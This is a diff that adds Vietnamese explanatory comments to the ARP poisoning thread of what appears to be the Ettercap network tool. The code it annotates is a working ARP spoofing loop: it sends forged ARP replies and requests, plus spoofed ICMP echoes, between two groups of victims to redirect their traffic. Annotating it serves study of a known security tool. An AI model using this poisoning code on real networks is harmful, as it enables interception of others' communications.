@@ -260,6 +260,10 @@ static void arp_poisoning_stop(void)
 
 /*
  * the real ARP POISONER thread
+
+ Đoạn mã bạn cung cấp là một hàm con thực hiện quá trình ARP poisoning 
+ bằng cách gửi các gói tin ARP giả mạo để làm nhiễu bảng ARP của các thiết bị 
+ trong mạng
  */
 EC_THREAD_FUNC(arp_poisoner)
 {
@@ -269,40 +273,58 @@ EC_THREAD_FUNC(arp_poisoner)
    /* variable not used */
    (void) EC_THREAD_PARAM;
 
-   /* init the thread and wait for start up */
-   ec_thread_init();
+   /* init the thread and wait for start up 
+   Thread này sẽ hoạt động vô hạn trong vòng lặp LOOP cho đến khi 
+   bị hủy bỏ hoặc dừng lại do điều kiện đặc biệt.
+   */
+   ec_thread_init();    //Khởi tạo thread.
   
    /* never ending loop */
    LOOP {
       
       CANCELLATION_POINT();
       
-      /* walk the lists and poison the victims */
+      /* walk the lists and poison the victims 
+      Duyệt qua danh sách các nạn nhân trong nhóm 1 (arp_group_one).*/
       LIST_FOREACH(g1, &arp_group_one, next) {
+
+         /*Duyệt qua danh sách các nạn nhân trong nhóm 2 (arp_group_two).*/
          LIST_FOREACH(g2, &arp_group_two, next) {
 
-            /* equal ip must be skipped, you cant poison itself */
+            /* Không tấn công chính mình: Nếu địa chỉ IP của hai thiết bị 
+            trong g1 và g2 là giống nhau (ip_addr_cmp(&g1->ip, &g2->ip) trả về 0), 
+            chương trình sẽ bỏ qua việc gửi gói tin ARP, tránh tự tấn công. */
             if (!ip_addr_cmp(&g1->ip, &g2->ip))
                continue;
            
             if (!EC_GBL_CONF->arp_poison_equal_mac)
-               /* skip even equal mac address... */
+               /* Không tấn công các thiết bị có cùng địa chỉ MAC: Nếu địa chỉ MAC 
+               của hai thiết bị giống nhau (memcmp(g1->mac, g2->mac, MEDIA_ADDR_LEN) 
+               trả về 0) và tùy chọn arp_poison_equal_mac bị tắt, chương trình sẽ 
+               bỏ qua gói tin ARP.*/
                if (!memcmp(g1->mac, g2->mac, MEDIA_ADDR_LEN))
                   continue;
             
             /* 
-             * send the spoofed ICMP echo request 
-             * to force the arp entry in the cache
+             * Nếu tùy chọn arp_poison_icmp được bật, chương trình sẽ gửi 
+             các gói tin ICMP Echo Request (ping) giữa hai nạn nhân để giúp 
+             đẩy nhanh quá trình cập nhật bảng ARP.
              */
             if (i == 1 && EC_GBL_CONF->arp_poison_icmp) {
+               //send_L2_icmp_echo: Gửi gói tin ICMP echo từ nạn nhân nhóm 2 (g2) 
+               // đến nạn nhân nhóm 1 (g1).
                send_L2_icmp_echo(ICMP_ECHO, &g2->ip, &g1->ip, g1->mac);
-               /* only send from T2 to T1 */
+               /* only send from T2 to T1 
+               Nếu tùy chọn poison_oneway chưa bật, gói ICMP cũng sẽ được 
+               gửi theo chiều ngược lại.
+               */
                if (!poison_oneway)
                   send_L2_icmp_echo(ICMP_ECHO, &g1->ip, &g2->ip, g2->mac);
             }
             
             /* the effective poisoning packets */
             if (EC_GBL_CONF->arp_poison_reply) {
+               // gửi ARP reply packages from g2 to g1
                send_arp(ARPOP_REPLY, &g2->ip, EC_GBL_IFACE->mac, &g1->ip, g1->mac); 
                /* only send from T2 to T1 */
                if (!poison_oneway)
@@ -310,12 +332,13 @@ EC_THREAD_FUNC(arp_poisoner)
             }
             /* request attack */
             if (EC_GBL_CONF->arp_poison_request) {
+               // gửi ARP request từ nạn nhân nhóm 2 đến nạn nhân nhóm 1
                send_arp(ARPOP_REQUEST, &g2->ip, EC_GBL_IFACE->mac, &g1->ip, g1->mac); 
                /* only send from T2 to T1 */
                if (!poison_oneway)
                   send_arp(ARPOP_REQUEST, &g1->ip, EC_GBL_IFACE->mac, &g2->ip, g2->mac); 
             }
-          
+            // sau mỗi lần gửi ARP chtrinh tạm dừng 1 ~ tgian = arp_storm_delay
             ec_usleep(MILLI2MICRO(EC_GBL_CONF->arp_storm_delay));
          }
       }
